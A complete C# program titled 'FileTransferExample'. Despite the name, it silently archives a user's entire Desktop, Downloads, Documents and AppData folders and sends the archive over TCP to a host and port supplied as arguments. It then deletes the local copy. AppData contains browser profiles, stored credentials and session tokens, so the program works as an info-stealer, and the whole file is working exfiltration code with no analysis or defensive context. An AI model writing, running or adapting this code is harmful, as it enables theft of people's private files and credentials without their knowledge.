using System;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;

namespace FileTransferExample
{
    class Program
    {
        static void CreateRar(string rarPath)
        {
            try
            {
                string userFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string desktopPath = Path.Combine(userFolderPath, "Desktop");
                string downloadPath = Path.Combine(userFolderPath, "Downloads");
                string documentPath = Path.Combine(userFolderPath, "Documents");
                string appdataPath = Path.Combine(userFolderPath, "AppData");

                using (FileStream fsOut = new FileStream(rarPath, FileMode.Create))
                {
                    using (ZipArchive archive = new ZipArchive(fsOut, ZipArchiveMode.Create))
                    {
                        AddFolderToZip(archive, desktopPath);
                        AddFolderToZip(archive, downloadPath);
                        AddFolderToZip(archive, documentPath);
                        AddFolderToZip(archive, appdataPath);
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine($"Unauthorized access exception: {ex.Message}");
                // Log the exception or handle it as per your application's requirements
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception: {ex.Message}");
                // Handle other exceptions if needed
            }
        }

        static void AddFolderToZip(ZipArchive archive, string folderPath)
        {
            if (!Directory.Exists(folderPath))
            {
                Console.WriteLine($"Directory '{folderPath}' does not exist or access is denied.");
                return;
            }

            foreach (string filePath in Directory.GetFiles(folderPath, "*", SearchOption.AllDirectories))
            {
                ZipArchiveEntry entry = archive.CreateEntryFromFile(filePath, filePath.Substring(folderPath.Length + 1));
            }
        }

        static void SendFile(string host, int port, string filePath)
        {
            TcpClient client = new TcpClient();
            client.Connect(host, port);

            using (NetworkStream stream = client.GetStream())
            {
                using (FileStream fileStream = File.OpenRead(filePath))
                {
                    byte[] fileSizeBytes = BitConverter.GetBytes(fileStream.Length);
                    stream.Write(fileSizeBytes, 0, fileSizeBytes.Length);

                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        stream.Write(buffer, 0, bytesRead);
                    }
                }
            }

            client.Close();
        }

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: FileTransferExample <host> <port>");
                return;
            }

            string rarPath = "snapshot.zip";
            string host = args[0];
            int port = int.Parse(args[1]);

            CreateRar(rarPath);
            SendFile(host, port, rarPath);

            File.Delete(rarPath); // Delete the file after sending

            Console.WriteLine("File transfer completed.");
        }
    }
}
